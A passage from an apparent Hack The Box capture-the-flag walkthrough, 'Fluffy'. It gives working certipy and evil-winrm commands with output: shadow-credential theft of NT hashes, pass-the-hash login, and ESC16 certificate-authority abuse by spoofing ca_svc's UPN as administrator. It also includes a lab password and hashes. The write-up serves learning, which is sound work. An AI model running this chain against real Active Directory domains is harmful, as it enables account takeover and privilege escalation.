</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Restoring<span class="w"> </span>the<span class="w"> </span>old<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>restored<span class="w"> </span>the<span class="w"> </span>old<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>
</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span>:<span class="w"> </span>33bd09dcd697600edf6b3a7af4875767
</span></code></pre></div><br />
great! now lets login to <code>winrm_svc</code> with this hash <code>33bd09dcd697600edf6b3a7af4875767</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.11.69<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;winrm_svc&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;33bd09dcd697600edf6b3a7af4875767&#39;</span>
</span></code></pre></div><br />
and grab the user flag!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>84f38474ff40ababe763e4ec474cd157
</span></code></pre></div></p>
<h3 id="towards-ca_svc">Towards CA_SVC</h3>
<p>Similarly, since we have <code>GenericWrite</code> towards ca_svc too, lets get NT hash for <code>ca_svc</code> too, and we will see later how it will be used:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>certipy<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-u<span class="w"> </span>p.agila@fluffy.htb<span class="w"> </span>-p<span class="w"> </span>prometheusx-303<span class="w"> </span>-account<span class="w"> </span>ca_svc
</span></code></pre></div><br />
(the output here is similar to winrm_svc, its snipped)<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>[*] Successfully restored the old Key Credentials for &#39;ca_svc&#39;
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>[*] NT hash for &#39;ca_svc&#39;: ca0f4f9e9eb8a092addf53bb03fc98c8
</span></code></pre></div></p>
<h1 id="privesc">Privesc</h1>
<p>Since <code>ca_svc</code> user exists, this signals the presence of certificate authority, so lets find out more about it by identifying vulnerable certificates first:</p>
<h2 id="searching-for-vulnerable-certificates">Searching for vulnerable certificates</h2>
<p>By using certipy i am going to search whether there are vulnerable certs present<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-vulnerable<span class="w"> </span>-u<span class="w"> </span>CA_SVC<span class="w"> </span>-hashes<span class="w"> </span><span class="s2">&quot;:ca0f4f9e9eb8a092addf53bb03fc98c8&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.69
</span></code></pre></div><br />
found no templates, but lets update certipy to latest version and try again<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-vulnerable<span class="w"> </span>-u<span class="w"> </span>CA_SVC<span class="w"> </span>-hashes<span class="w"> </span><span class="s2">&quot;:ca0f4f9e9eb8a092addf53bb03fc98c8&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.69
</span></code></pre></div><br />
output:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Certipy<span class="w"> </span>v5.0.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>templates
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">33</span><span class="w"> </span>certificate<span class="w"> </span>templates
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>authorities
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>certificate<span class="w"> </span>authority
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">11</span><span class="w"> </span>enabled<span class="w"> </span>certificate<span class="w"> </span>templates
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>issuance<span class="w"> </span>policies
</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">14</span><span class="w"> </span>issuance<span class="w"> </span>policies
</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>OIDs<span class="w"> </span>linked<span class="w"> </span>to<span class="w"> </span>templates
</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Retrieving<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;fluffy-DC01-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>RRP
</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>retrieved<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;fluffy-DC01-CA&#39;</span>
</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>web<span class="w"> </span>enrollment<span class="w"> </span><span class="k">for</span><span class="w"> </span>CA<span class="w"> </span><span class="s1">&#39;fluffy-DC01-CA&#39;</span><span class="w"> </span>@<span class="w"> </span><span class="s1">&#39;DC01.fluffy.htb&#39;</span>
</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>checking<span class="w"> </span>web<span class="w"> </span>enrollment:<span class="w"> </span>timed<span class="w"> </span>out
</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Use<span class="w"> </span>-debug<span class="w"> </span>to<span class="w"> </span>print<span class="w"> </span>a<span class="w"> </span>stacktrace
</span><span id="__span-45-16"><a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>checking<span class="w"> </span>web<span class="w"> </span>enrollment:<span class="w"> </span>timed<span class="w"> </span>out
</span><span id="__span-45-17"><a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Use<span class="w"> </span>-debug<span class="w"> </span>to<span class="w"> </span>print<span class="w"> </span>a<span class="w"> </span>stacktrace
</span><span id="__span-45-18"><a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>text<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20250529120822_Certipy.txt&#39;</span>
</span><span id="__span-45-19"><a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Wrote<span class="w"> </span>text<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20250529120822_Certipy.txt&#39;</span>
</span><span id="__span-45-20"><a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>JSON<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20250529120822_Certipy.json&#39;</span>
</span><span id="__span-45-21"><a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Wrote<span class="w"> </span>JSON<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20250529120822_Certipy.json&#39;</span>
</span><span id="__span-45-22"><a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a>
</span><span id="__span-45-23"><a id="__codelineno-45-23" name="__codelineno-45-23" href="#__codelineno-45-23"></a>cat<span class="w"> </span>20250529120822_Certipy.txt<span class="w"> </span>
</span><span id="__span-45-24"><a id="__codelineno-45-24" name="__codelineno-45-24" href="#__codelineno-45-24"></a>Certificate<span class="w"> </span>Authorities
</span><span id="__span-45-25"><a id="__codelineno-45-25" name="__codelineno-45-25" href="#__codelineno-45-25"></a><span class="w">  </span><span class="m">0</span>
</span><span id="__span-45-26"><a id="__codelineno-45-26" name="__codelineno-45-26" href="#__codelineno-45-26"></a><span class="w">    </span>CA<span class="w"> </span>Name<span class="w">                             </span>:<span class="w"> </span>fluffy-DC01-CA
</span><span id="__span-45-27"><a id="__codelineno-45-27" name="__codelineno-45-27" href="#__codelineno-45-27"></a><span class="w">    </span>DNS<span class="w"> </span>Name<span class="w">                            </span>:<span class="w"> </span>DC01.fluffy.htb
</span><span id="__span-45-28"><a id="__codelineno-45-28" name="__codelineno-45-28" href="#__codelineno-45-28"></a><span class="w">    </span>Certificate<span class="w"> </span>Subject<span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>fluffy-DC01-CA,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>fluffy,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>htb
</span><span id="__span-45-29"><a id="__codelineno-45-29" name="__codelineno-45-29" href="#__codelineno-45-29"></a><span class="w">    </span>Certificate<span class="w"> </span>Serial<span class="w"> </span>Number<span class="w">           </span>:<span class="w"> </span>3670C4A715B864BB497F7CD72119B6F5
</span><span id="__span-45-30"><a id="__codelineno-45-30" name="__codelineno-45-30" href="#__codelineno-45-30"></a><span class="w">    </span>Certificate<span class="w"> </span>Validity<span class="w"> </span>Start<span class="w">          </span>:<span class="w"> </span><span class="m">2025</span>-04-17<span class="w"> </span><span class="m">16</span>:00:16+00:00
</span><span id="__span-45-31"><a id="__codelineno-45-31" name="__codelineno-45-31" href="#__codelineno-45-31"></a><span class="w">    </span>Certificate<span class="w"> </span>Validity<span class="w"> </span>End<span class="w">            </span>:<span class="w"> </span><span class="m">3024</span>-04-17<span class="w"> </span><span class="m">16</span>:11:16+00:00
</span><span id="__span-45-32"><a id="__codelineno-45-32" name="__codelineno-45-32" href="#__codelineno-45-32"></a><span class="w">    </span>Web<span class="w"> </span>Enrollment
</span><span id="__span-45-33"><a id="__codelineno-45-33" name="__codelineno-45-33" href="#__codelineno-45-33"></a><span class="w">      </span>HTTP
</span><span id="__span-45-34"><a id="__codelineno-45-34" name="__codelineno-45-34" href="#__codelineno-45-34"></a><span class="w">        </span>Enabled<span class="w">                         </span>:<span class="w"> </span>False
</span><span id="__span-45-35"><a id="__codelineno-45-35" name="__codelineno-45-35" href="#__codelineno-45-35"></a><span class="w">      </span>HTTPS
</span><span id="__span-45-36"><a id="__codelineno-45-36" name="__codelineno-45-36" href="#__codelineno-45-36"></a><span class="w">        </span>Enabled<span class="w">                         </span>:<span class="w"> </span>False
</span><span id="__span-45-37"><a id="__codelineno-45-37" name="__codelineno-45-37" href="#__codelineno-45-37"></a><span class="w">    </span>User<span class="w"> </span>Specified<span class="w"> </span>SAN<span class="w">                  </span>:<span class="w"> </span>Disabled
</span><span id="__span-45-38"><a id="__codelineno-45-38" name="__codelineno-45-38" href="#__codelineno-45-38"></a><span class="w">    </span>Request<span class="w"> </span>Disposition<span class="w">                 </span>:<span class="w"> </span>Issue
</span><span id="__span-45-39"><a id="__codelineno-45-39" name="__codelineno-45-39" href="#__codelineno-45-39"></a><span class="w">    </span>Enforce<span class="w"> </span>Encryption<span class="w"> </span><span class="k">for</span><span class="w"> </span>Requests<span class="w">     </span>:<span class="w"> </span>Enabled
</span><span id="__span-45-40"><a id="__codelineno-45-40" name="__codelineno-45-40" href="#__codelineno-45-40"></a><span class="w">    </span>Active<span class="w"> </span>Policy<span class="w">                       </span>:<span class="w"> </span>CertificateAuthority_MicrosoftDefault.Policy
</span><span id="__span-45-41"><a id="__codelineno-45-41" name="__codelineno-45-41" href="#__codelineno-45-41"></a><span class="w">    </span>Disabled<span class="w"> </span>Extensions<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.311.25.2
</span><span id="__span-45-42"><a id="__codelineno-45-42" name="__codelineno-45-42" href="#__codelineno-45-42"></a><span class="w">    </span>Permissions
</span><span id="__span-45-43"><a id="__codelineno-45-43" name="__codelineno-45-43" href="#__codelineno-45-43"></a><span class="w">      </span>Owner<span class="w">                             </span>:<span class="w"> </span>FLUFFY.HTB<span class="se">\A</span>dministrators
</span><span id="__span-45-44"><a id="__codelineno-45-44" name="__codelineno-45-44" href="#__codelineno-45-44"></a><span class="w">      </span>Access<span class="w"> </span>Rights
</span><span id="__span-45-45"><a id="__codelineno-45-45" name="__codelineno-45-45" href="#__codelineno-45-45"></a><span class="w">        </span>ManageCa<span class="w">                        </span>:<span class="w"> </span>FLUFFY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
</span><span id="__span-45-46"><a id="__codelineno-45-46" name="__codelineno-45-46" href="#__codelineno-45-46"></a><span class="w">                                          </span>FLUFFY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
</span><span id="__span-45-47"><a id="__codelineno-45-47" name="__codelineno-45-47" href="#__codelineno-45-47"></a><span class="w">                                          </span>FLUFFY.HTB<span class="se">\A</span>dministrators
</span><span id="__span-45-48"><a id="__codelineno-45-48" name="__codelineno-45-48" href="#__codelineno-45-48"></a><span class="w">        </span>ManageCertificates<span class="w">              </span>:<span class="w"> </span>FLUFFY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
</span><span id="__span-45-49"><a id="__codelineno-45-49" name="__codelineno-45-49" href="#__codelineno-45-49"></a><span class="w">                                          </span>FLUFFY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
</span><span id="__span-45-50"><a id="__codelineno-45-50" name="__codelineno-45-50" href="#__codelineno-45-50"></a><span class="w">                                          </span>FLUFFY.HTB<span class="se">\A</span>dministrators
</span><span id="__span-45-51"><a id="__codelineno-45-51" name="__codelineno-45-51" href="#__codelineno-45-51"></a><span class="w">        </span>Enroll<span class="w">                          </span>:<span class="w"> </span>FLUFFY.HTB<span class="se">\C</span>ert<span class="w"> </span>Publishers
</span><span id="__span-45-52"><a id="__codelineno-45-52" name="__codelineno-45-52" href="#__codelineno-45-52"></a><span class="w">    </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Vulnerabilities
</span><span id="__span-45-53"><a id="__codelineno-45-53" name="__codelineno-45-53" href="#__codelineno-45-53"></a><span class="w">      </span>ESC16<span class="w">                             </span>:<span class="w"> </span>Security<span class="w"> </span>Extension<span class="w"> </span>is<span class="w"> </span>disabled.
</span><span id="__span-45-54"><a id="__codelineno-45-54" name="__codelineno-45-54" href="#__codelineno-45-54"></a><span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Remarks
</span><span id="__span-45-55"><a id="__codelineno-45-55" name="__codelineno-45-55" href="#__codelineno-45-55"></a><span class="w">      </span>ESC16<span class="w">                             </span>:<span class="w"> </span>Other<span class="w"> </span>prerequisites<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>required<span class="w"> </span><span class="k">for</span><span class="w"> </span>this<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>exploitable.<span class="w"> </span>See<span class="w"> </span>the<span class="w"> </span>wiki<span class="w"> </span><span class="k">for</span><span class="w"> </span>more<span class="w"> </span>details.
</span><span id="__span-45-56"><a id="__codelineno-45-56" name="__codelineno-45-56" href="#__codelineno-45-56"></a>Certificate<span class="w"> </span>Templates<span class="w">                   </span>:<span class="w"> </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>any<span class="w"> </span>certificate<span class="w"> </span>templates
</span></code></pre></div><br />
There is <code>ESC16</code> vulnerability! </p>
<h2 id="exploiting-esc16">Exploiting ESC16</h2>
<h4 id="1-read-the-original-upn-of-the-victim-account-optional-for-recovery"><strong>1 : Read the original UPN of the victim account (optional - for recovery).</strong></h4>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>certipy-ad<span class="w"> </span>account<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span><span class="w"> </span><span class="nb">read</span>
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Reading<span class="w"> </span>attributes<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>:
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="w">    </span>cn<span class="w">                                  </span>:<span class="w"> </span>certificate<span class="w"> </span>authority<span class="w"> </span>service
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="w">    </span>distinguishedName<span class="w">                   </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>certificate<span class="w"> </span>authority<span class="w"> </span>service,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="w">    </span>name<span class="w">                                </span>:<span class="w"> </span>certificate<span class="w"> </span>authority<span class="w"> </span>service
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="w">    </span>objectSid<span class="w">                           </span>:<span class="w"> </span>S-1-5-21-497550768-2797716248-2627064577-1103
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="w">    </span>sAMAccountName<span class="w">                      </span>:<span class="w"> </span>ca_svc
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="w">    </span>servicePrincipalName<span class="w">                </span>:<span class="w"> </span>ADCS/ca.fluffy.htb
</span></code></pre></div></p>
<h4 id="2-update-the-victim-accounts-upn-to-that-of-the-target-administrator-samaccountname"><strong>2: Update the victim account’s UPN to that of the target administrator <code>sAMAccountName</code>.</strong></h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>certipy-ad<span class="w"> </span>account<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w">  </span>-upn<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w">  </span>-user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span><span class="w"> </span>update
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Updating<span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>:
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="w">    </span>userPrincipalName<span class="w">                   </span>:<span class="w"> </span>administrator
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>updated<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span></code></pre></div></p>
<h4 id="3-request-a-certificate-issued-as-the-victim-user-from-any-appropriate-client-authentication-template-eg-user-on-the-ca-vulnerable-to-esc16"><strong>3: Request a certificate issued as the "victim" user from any appropriate client authentication template* (e.g., "user") on the CA vulnerable to ESC16</strong></h4>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;p.agila@fluffy.htb&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">&#39;10.10.11.69&#39;</span><span class="w"> </span>-account<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span><span class="w"> </span>auto
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Targeting<span class="w"> </span>user<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>certificate
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>generated
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>Key<span class="w"> </span>Credential
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>generated<span class="w"> </span>with<span class="w"> </span>DeviceID<span class="w"> </span><span class="s1">&#39;d6fa2c18-58bb-8509-b2f8-6eca381c72c2&#39;</span>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>with<span class="w"> </span>device<span class="w"> </span>ID<span class="w"> </span><span class="s1">&#39;d6fa2c18-58bb-8509-b2f8-6eca381c72c2&#39;</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span>Key<span class="w"> </span>Credential<span class="w"> </span>with<span class="w"> </span>device<span class="w"> </span>ID<span class="w"> </span><span class="s1">&#39;d6fa2c18-58bb-8509-b2f8-6eca381c72c2&#39;</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Key<span class="w"> </span>Credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span>
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Authenticating<span class="w"> </span>as<span class="w"> </span><span class="s1">&#39;ca_svc&#39;</span><span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>certificate
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>ca_svc@fluffy.htb
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;ca_svc.ccache&#39;</span>
